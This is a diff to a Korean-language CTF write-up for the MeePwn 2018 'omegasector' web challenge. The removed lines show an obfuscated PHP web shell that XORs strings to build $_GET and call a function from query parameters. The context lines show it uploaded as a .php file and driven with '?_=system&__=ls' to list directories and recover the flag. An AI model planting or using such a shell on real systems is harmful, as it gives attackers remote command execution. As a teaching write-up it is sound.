@@ -315,23 +315,13 @@ http://human.ludibrium.meepwn.team/?human=Yes
 
 고민하던 중, [여기](https://rawsec.ml/en/MeePwn-2018-write-up/#omegasector-web)에서 방법을 찾을 수 있었다.  
 
-```
-<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
-```
+![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_14.PNG)
 
 코드를 보기 좋게 정리하면 다음과 같다.  
 
-```
-<?=
-$_= "`{{{" ^ "?<>/";
-${$_}[_](${$_}[__]);
-```
+![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_15.PNG)
 
-```
-1. \<?= : php 코드의 시작(= <?php)
-2. $_= "`{{{" ^ "?<>/"; : `{{{ XOR ?<>/ 연산 (= _GET)
-3. {$_}[_](${$_}[__]); : function($_GET['a']); 형태로 만들기 (= $_GET[_]($_GET[__]))
-```
+![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_16.PNG)
 
 결과적으로 위의 함수는 아래와 같다.  
 
@@ -345,17 +335,17 @@ ${$_}[_](${$_}[__]);
 
 먼저 해당 문자열을 `message`에 적고, `type`은 `php`로 해 아래와 같이 파일을 생성 해 주었다.  
 
-![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_14.PNG)
+![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_17.PNG)
 
-![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_15.PNG)
+![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_18.PNG)
 
 이 후 생성된 파일에 직접 접근하며, `?_=system&__=ls`를 쿼리스트링으로 넘겨주었다.  
 
-![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_16.PNG)
+![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_19.PNG)
 
 그 결과, 아래와 같이 `ls` 명령어가 실행된 것을 확인할 수 있었다.  
 
-![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_17.PNG)
+![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_20.PNG)
 
 현재 디렉토리인 `alien_message` 디렉토리에는 플래그로 보이는 값이 없어, 상위 디렉토리를 확인하기 위해 `?_=system&__=ls ../`를 쿼리스트링으로 넘겨주었다.  
 
@@ -375,7 +365,7 @@ secret.php
 
 그 결과 이번에도 역시 주석에서 flag를 발견할 수 있었다.  
 
-![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_18.PNG)
+![]({{ site.baseurl }}/images/CTF/MeePwn2018/omegasector/omega_21.PNG)
 
 ```
 FLAG : MeePwnCTF{__133-221-333-123-111___}
